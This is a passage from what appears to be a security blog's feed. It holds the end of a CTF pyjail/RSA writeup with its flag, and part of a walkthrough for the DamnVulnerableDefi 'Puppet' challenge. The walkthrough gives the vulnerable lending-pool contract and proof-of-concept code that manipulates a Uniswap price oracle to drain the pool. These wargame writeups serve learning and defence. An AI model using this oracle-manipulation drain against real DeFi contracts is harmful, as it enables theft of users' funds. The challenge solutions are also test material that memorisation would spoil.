style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;:_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c&amp;#34;&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;N}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; (repeated &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; times total)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{X(_[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;])}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And at the end, we put &lt;code&gt;{X(_[&amp;quot;r&amp;quot;])}&lt;/code&gt; to output the decrypted ciphertext (stored as &lt;code&gt;r&lt;/code&gt;). Remember that all of this code is to be entered one character per line, so &lt;code&gt;X(_[&amp;quot;r&amp;quot;])&lt;/code&gt; had to be surrounded in the curly braces &lt;code&gt;{}&lt;/code&gt;, otherwise it wouldn&amp;rsquo;t work - this messed me up before :&amp;lt;&lt;/p&gt;
&lt;h3 id=&#34;final-solve-1&#34;&gt;Final solve&lt;/h3&gt;
&lt;p&gt;Finally, with all the steps done, we can now start gambling for the flag! Remember how theres like a ~20% chance of getting the flag each time, and how the code takes 2 minutes to run each time.&lt;/p&gt;
&lt;p&gt;But first, how do we actually send the solution code, which after optimisations (such as replacing &lt;code&gt;2*2&lt;/code&gt; with &lt;code&gt;4&lt;/code&gt;, etc.), replacing dictionary key names, and having 1 character per line, turned out to be almost 4 million lines long.&lt;/p&gt;

  &lt;img src=&#34;./img/bruh.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;At first I tried using &lt;a href=&#34;https://docs.pwntools.com/en/stable/&#34;&gt;pwntools&lt;/a&gt;, but it kept freezing/EOF erroring for some reason, even when I split up chunks of it or tried sending it one line at a time. Maybe it&amp;rsquo;s just a skill issue.&lt;/p&gt;
&lt;p&gt;Next, I tried connecting manually, and pasting it directly into the terminal. For Windows Terminal, this caused it to crash, but somehow it worked on &lt;a href=&#34;https://en.wikipedia.org/wiki/Windows_Subsystem_for_Linux&#34;&gt;WSL&lt;/a&gt;. It took 5 minutes to load, not to mention there is a PoW to solve each time. So I opened multiple terminals, and prayed.&lt;/p&gt;
&lt;p&gt;Eventually, we got the flag.&lt;/p&gt;

  &lt;img src=&#34;./img/les-goooo.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;&lt;code&gt;bwctf{Did_you_have_fun_with_only_one_variable?_Good_thing_*tuple*_exists_UwU}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;You can view the final formatted code &lt;a href=&#34;https://TheSavageTeddy.github.io/posts/rsajail-bwctf-2024/final_fmtted.txt&#34;&gt;here&lt;/a&gt;, but I suggest reading the &lt;a href=&#34;https://TheSavageTeddy.github.io/posts/rsajail-bwctf-2024/f4_final.txt&#34;&gt;unformatted version&lt;/a&gt;. Actually, both of them are practically unreadible, but there you go I guess.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This was a really nice set of challenges, combining both RSA (crypto?) and Pyjail.&lt;/p&gt;
&lt;p&gt;Thanks again to the challenge author &lt;a href=&#34;https://x.com/ah_p_uh&#34;&gt;soon haari&lt;/a&gt;, CTF organisers at Blue Water for hosting the event, and congrats to my team for getting top 10!&lt;/p&gt;
&lt;p&gt;Never in my life would I have thought I would need to manually implement integer division, and I hope I never have to do it again.&lt;/p&gt;

  &lt;img src=&#34;./img/i-love-integer-division-fr.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;As always, any typos/corrections/comments/whatever, feel free to DM me on discord &lt;code&gt;thesavageteddy&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Thanks for reading!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
    <item>
      <title>Puppet Writeup - DamnVulnerableDefi V3</title>
      <link>https://TheSavageTeddy.github.io/posts/puppet-damnvulnerabledefi/</link>
      <pubDate>Tue, 13 Feb 2024 21:10:00 +1100</pubDate>
      
      <guid>https://TheSavageTeddy.github.io/posts/puppet-damnvulnerabledefi/</guid>
      <description>&lt;p&gt;This post contains the walkthrough and solutions for &lt;a href=&#34;https://www.damnvulnerabledefi.xyz/challenges/puppet/&#34;&gt;Puppet&lt;/a&gt;, a challenge from the &lt;a href=&#34;https://www.damnvulnerabledefi.xyz&#34;&gt;DamnVulnerableDefi&lt;/a&gt; wargame, featuring a price oracle manipulation vulnerability.&lt;/p&gt;
&lt;h4 id=&#34;but-wait-why-another-writeup&#34;&gt;But wait, why another writeup?&lt;/h4&gt;
&lt;p&gt;You may be wondering why I‚Äôm making a writeup for this challenge, when there are already tons of other writeups online. Well, many of the writeups online &lt;strong&gt;don&amp;rsquo;t actually solve the challenge properly&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;There was a new solve condition added in V3 of DamnVulnerableDefi, which required you, the attacker (&lt;code&gt;player&lt;/code&gt;) to only make 1 transaction total.&lt;/p&gt;</description>
      <content>&lt;p&gt;This post contains the walkthrough and solutions for &lt;a href=&#34;https://www.damnvulnerabledefi.xyz/challenges/puppet/&#34;&gt;Puppet&lt;/a&gt;, a challenge from the &lt;a href=&#34;https://www.damnvulnerabledefi.xyz&#34;&gt;DamnVulnerableDefi&lt;/a&gt; wargame, featuring a price oracle manipulation vulnerability.&lt;/p&gt;
&lt;h4 id=&#34;but-wait-why-another-writeup&#34;&gt;But wait, why another writeup?&lt;/h4&gt;
&lt;p&gt;You may be wondering why I‚Äôm making a writeup for this challenge, when there are already tons of other writeups online. Well, many of the writeups online &lt;strong&gt;don&amp;rsquo;t actually solve the challenge properly&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;There was a new solve condition added in V3 of DamnVulnerableDefi, which required you, the attacker (&lt;code&gt;player&lt;/code&gt;) to only make 1 transaction total.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;expect&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethers&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;provider&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getTransactionCount&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;)).&lt;span style=&#34;color:#a6e22e&#34;&gt;to&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;eq&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;A lot of these online writeups didn&amp;rsquo;t account for this and hence made &lt;strong&gt;multiple transactions&lt;/strong&gt;. Their test script still shows that they passed the challenge, but this is because they might have simply created another account to run the attacks, or omitted &lt;code&gt;.connect(player)&lt;/code&gt; for some of the transactions, causing Hardhat to use the default account &lt;code&gt;deployer&lt;/code&gt;, both of which is not really solving the challenge properly.&lt;/p&gt;
&lt;p&gt;Executing the entire exploit in 1 transaction resulted in the challenge being a bit trickier, which we will explore in this post.&lt;/p&gt;
&lt;h1 id=&#34;challenge-overview&#34;&gt;Challenge Overview&lt;/h1&gt;
&lt;p&gt;Challenge Description:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;There‚Äôs a lending pool where users can borrow Damn Valuable Tokens (DVTs). To do so, they first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
&lt;br&gt;
&lt;br&gt;
There‚Äôs a DVT market opened in an old &lt;a href=&#34;https://docs.uniswap.org/contracts/v1/overview&#34;&gt;Uniswap v1 exchange&lt;/a&gt;, currently with 10 ETH and 10 DVT in liquidity.
&lt;br&gt;
&lt;br&gt;
Pass the challenge by taking all tokens from the lending pool. You start with 25 ETH and 1000 DVTs in balance.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;We are given source code of the lending pool, the DVT, and the test file:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;1&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;PuppetPool.sol&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import &amp;#34;@openzeppelin/contracts/security/ReentrancyGuard.sol&amp;#34;;
import &amp;#34;@openzeppelin/contracts/utils/Address.sol&amp;#34;;
import &amp;#34;../DamnValuableToken.sol&amp;#34;;

/**
 * @title PuppetPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetPool is ReentrancyGuard {
    using Address for address payable;

    uint256 public constant DEPOSIT_FACTOR = 2;

    address public immutable uniswapPair;
    DamnValuableToken public immutable token;

    mapping(address =&amp;gt; uint256) public deposits;

    error NotEnoughCollateral();
    error TransferFailed();

    event Borrowed(address indexed account, address recipient, uint256 depositRequired, uint256 borrowAmount);

    constructor(address tokenAddress, address uniswapPairAddress) {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
    }

    // Allows borrowing tokens by first depositing two times their value in ETH
    function borrow(uint256 amount, address recipient) external payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(amount);

        if (msg.value &amp;lt; depositRequired)
            revert NotEnoughCollateral();

        if (msg.value &amp;gt; depositRequired) {
            unchecked {
                payable(msg.sender).sendValue(msg.value - depositRequired);
            }
        }

        unchecked {
            deposits[msg.sender] &amp;#43;= depositRequired;
        }

        // Fails if the pool doesn&amp;#39;t have enough tokens in liquidity
        if(!token.transfer(recipient, amount))
            revert TransferFailed();

        emit Borrowed(msg.sender, recipient, depositRequired, amount);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;100&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;100&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;solidity&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;DamnValuableToken.sol&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-solidity&#34; &gt;&lt;code&gt;
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import &amp;#34;solmate/src/tokens/ERC20.sol&amp;#34;;

/**
 * @title DamnValuableToken
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract DamnValuableToken is ERC20 {
    constructor() ERC20(&amp;#34;DamnValuableToken&amp;#34;, &amp;#34;DVT&amp;#34;, 18) {
        _mint(msg.sender, type(uint256).max);
    }
}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;2&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;javascript&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;puppet.challenge.js&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-javascript&#34; &gt;&lt;code&gt;
const exchangeJson = require(&amp;#34;../../build-uniswap-v1/UniswapV1Exchange.json&amp;#34;);
const factoryJson = require(&amp;#34;../../build-uniswap-v1/UniswapV1Factory.json&amp;#34;);

const { ethers } = require(&amp;#39;hardhat&amp;#39;);
const { expect } = require(&amp;#39;chai&amp;#39;);
const { setBalance } = require(&amp;#34;@nomicfoundation/hardhat-network-helpers&amp;#34;);

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n &amp;#43; tokensSold * 997n);
}

describe(&amp;#39;[Challenge] Puppet&amp;#39;, function () {
    let deployer, player;
    let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool;

    const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n;
    const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n;

    const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n;
    const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n;

    const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, player] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
        
        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        token = await (await ethers.getContractFactory(&amp;#39;DamnValuableToken&amp;#39;, deployer)).deploy();

        // Deploy a exchange that will be used as the factory template
        exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        uniswapFactory = await UniswapFactoryFactory.deploy();
        await uniswapFactory.initializeFactory(exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange&amp;#39;s address
        let tx = await uniswapFactory.createExchange(token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        lendingPool = await (await ethers.getContractFactory(&amp;#39;PuppetPool&amp;#39;, deployer)).deploy(
            token.address,
            uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await token.approve(
            uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock(&amp;#39;latest&amp;#39;)).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await uniswapExchange.getTokenToEthInputPrice(
                10n ** 18n,
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                10n ** 18n,
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await lendingPool.calculateDepositRequired(10n ** 18n)
        ).to.be.eq(2n * 10n ** 18n);

        expect(
            await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE * 2n);
    });

    it(&amp;#39;Execution&amp;#39;, async function () {
        /** CODE YOUR SOLUTION HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player executed a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
        
        // Player has taken all tokens from the pool       
        expect(
            await token.balanceOf(lendingPool.address)
        ).to.be.eq(0, &amp;#39;Pool still has tokens&amp;#39;);

        expect(
            await token.balanceOf(player.address)
        ).to.be.gte(POOL_INITIAL_TOKEN_BALANCE, &amp;#39;Not enough token balance in player&amp;#39;);
    });
});
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Looking at the challenge description and source code, we can see that the target contract &lt;code&gt;PuppetPool&lt;/code&gt; has &lt;code&gt;100000&lt;/code&gt; DVTs (Damn Vulnerable Tokens) available for us to borrow. To borrow the DVTs, we need to provide 2 times the value in ETH as collateral. But how does the contract determine the value of DVT/ETH?&lt;/p&gt;
&lt;p&gt;The function &lt;code&gt;calculateDepositRequired(uint256 amount)&lt;/code&gt; returns the amount of ETH required to borrow &lt;code&gt;amount&lt;/code&gt; tokens. This function calls &lt;code&gt;_computeOraclePrice()&lt;/code&gt; which queries a Uniswap V1 exchange with 10 ETH and 10 DVT in liquidity. We start with &lt;code&gt;25&lt;/code&gt; ETH and &lt;code&gt;1000&lt;/code&gt; DVTs.&lt;/p&gt;
&lt;h1 id=&#34;price-oracle-manipulation&#34;&gt;Price Oracle Manipulation&lt;/h1&gt;
&lt;p&gt;We have much more ETH and DVT than the Uniswap exchange, which we can abuse to manipulate the price of DVT/ETH. For example, if we exchange all &lt;code&gt;1000&lt;/code&gt; of our DVTs for ETH in the Uniswap exchange, it will drastically increase the supply of DVTs, and reduce the supply of ETH, inflating the price of ETH.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s say we swap &lt;code&gt;1000&lt;/code&gt; DVT for &lt;code&gt;9.9&lt;/code&gt; ETH. The Uniswap exchange will have &lt;code&gt;1010&lt;/code&gt; DVT and &lt;code&gt;0.1&lt;/code&gt; ETH left, and now reports a price of roughly &lt;code&gt;1&lt;/code&gt; ETH per &lt;code&gt;10100&lt;/code&gt; DVT. As the lending pool relies on this Uniswap exchange for the price of DVT, it will use this pricing for the collateral, and we can borrow &lt;code&gt;100000&lt;/code&gt; DVT for around &lt;code&gt;20&lt;/code&gt; ETH (providing 2 times ETH for collateral), draining the pool and solving the challenge.&lt;/p&gt;
&lt;p&gt;We write a quick proof of concept to see this working in action:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;3&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;javascript&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;puppet.challenge.js&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-javascript&#34; &gt;&lt;code&gt;
it(&amp;#39;Execution&amp;#39;, async function () {
    /** CODE YOUR SOLUTION HERE */

    console.log(&amp;#34;=== Initial balances &amp;amp; prices ===&amp;#34;)
    console.log(`ETH balance: ${await ethers.provider.getBalance(player.address) / (10**18)}`)
    console.log(`DVT balance: ${await token.connect(player).balanceOf(player.address) / (10**18)}`)
    console.log(`Price of 1000 DVT: ${
        await lendingPool.connect(player).calculateDepositRequired(1000n * 10n**18n) / (10**18)
    } ETH`)
    // approve uniswapExchange to use our DVTs
    await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE)
    // swap our DVTs for ETH
    await uniswapExchange.connect(player).tokenToEthSwapInput(
        PLAYER_INITIAL_TOKEN_BALANCE, // swapping 10000 DVTs
        99n * 10n**17n, // for 9.9 ETH minimum
        (await ethers.provider.getBlock(&amp;#39;latest&amp;#39;)).timestamp &amp;#43; 3600 // deadline (not important)
    )
    console.log(&amp;#34;=== After manipulation ===&amp;#34;)
    console.log(`ETH: ${await ethers.provider.getBalance(player.address) / (10**18)}`)
    console.log(`DVT: ${await token.connect(player).balanceOf(player.address) / (10**18)}`)
    console.log(`Price of 1000 DVT: ${
        await lendingPool.connect(player).calculateDepositRequired(1000n * 10n**18n) / (10**18)
    } ETH`)

});
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;



  &lt;img src=&#34;./img/poc.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; max-width: 80%;&#34;  /&gt;


&lt;p&gt;&lt;em&gt;Small note: You can see I renamed the challenge &amp;lsquo;Puppet v1&amp;rsquo; as there are 2 other challenges named &amp;lsquo;Puppet&amp;rsquo; which also get ran if I use &lt;code&gt;--grep &#39;Puppet&#39;&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;As shown in the image, the price of DVT dropped significantly, allowing us to drain the lending pool with just 20 ETH (which we have enough of).&lt;/p&gt;
&lt;p&gt;However, if we do borrow the &lt;code&gt;100000&lt;/code&gt; tokens and drain the lending pool, we still don&amp;rsquo;t pass the challenge, because as discussed before, everything needs to be done in exactly 1 transaction:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=== Borrowing 100000 DVTs ===&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethRequiredToDrain&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lendingPool&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;connect&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;calculateDepositRequired&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;100000&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lendingPool&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;connect&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;borrow&lt;/span&gt;(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;100000&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;n&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;// amount of DVT to borrow
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;, &lt;span style=&#34;color:#75715e&#34;&gt;// recipient of borrowed DVTs 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    {&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ethRequiredToDrain&lt;/span&gt;} &lt;span style=&#34;color:#75715e&#34;&gt;// send ETH as collateral
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Player DVTs: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;balanceOf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;player&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Lending Pool DVTs: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;await&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;token&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;balanceOf&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;lendingPool&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;address&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;./img/fail.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; max-width: 80%;&#34;  /&gt;


&lt;p&gt;Solve requirement which is not met:&lt;/p&gt;
